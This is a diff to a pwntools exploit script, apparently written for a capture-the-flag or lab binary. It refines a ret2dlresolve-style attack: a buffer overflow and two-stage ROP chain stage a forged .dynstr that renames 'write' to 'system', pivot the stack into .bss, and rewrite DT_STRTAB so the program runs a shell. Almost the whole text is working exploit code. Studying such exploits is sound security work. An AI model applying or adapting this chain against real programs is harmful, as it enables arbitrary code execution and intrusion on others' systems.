@@ -55,15 +55,15 @@ def pwn():
 	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
 	fake_dynstr_addr = binsh_addr + 8
 	aligned_data_len = (len(sh) + len(fake_dynstr) + 0xf) & 0xfffffff0
-	new_stk = data_addr + aligned_data_len
+	stk_off = aligned_data_len + 0x280
+	new_stk = data_addr + stk_off
 	
 	log.info(".dynamic@%#x\nDT_STRTAB's val=%#x\n.bss@%#x\ndata@%x\nrop@%#x\n", dynamic_shaddr, addr_dt_strtab, bss_addr, data_addr, new_stk)
 
 	padding = 'a' * bof_padding_len
 	rop = ROP(g_elf)
 	rop.raw(padding)
-	#rop.raw(ropArgs3(0, data_addr, aligned_data_len + 0x200, g_elf.got["read"]))
-	rop.raw(ropArgs3(0, data_addr, 0x100, g_elf.got["read"]))
+	rop.raw(ropArgs3(0, data_addr, stk_off + 0x100, g_elf.got["read"]))
 	rop.raw(vuln_addr)
 	# vuln() don't have enough bof space, we have to do ROP in 2 steps.
 	print("rop chain length: %d\n" % len(rop.chain()))
@@ -78,14 +78,15 @@ def pwn():
 	rop.raw(binsh_addr)
 	rop.raw(write_plt)
 	raw_rop = rop.chain()
-	second_read_payload = flat({0:sh, len(sh):fake_dynstr, aligned_data_len:raw_rop})
+	log.info("raw_rop length=%d\n", len(raw_rop))
+	second_read_payload = flat({0:sh, len(sh):fake_dynstr, stk_off:raw_rop}).ljust(stk_off+0x100, b'\x00')
 	# 2nd. read to .bss
 	g_io.send(second_read_payload)
 	# 3rd. read, from vuln(), to bof of ROP-migrate
 	rop = ROP(g_elf)
 	rop.raw(padding)
 	rop.migrate(new_stk)
-	g_io.send(rop.chain())
+	g_io.send(rop.chain().ljust(0x100, b'\x00'))
 	# 4th. read to .dynamic's DT_STRTAB entry, make it points to fake_dynstr
 	g_io.send(flat(fake_dynstr_addr))
 
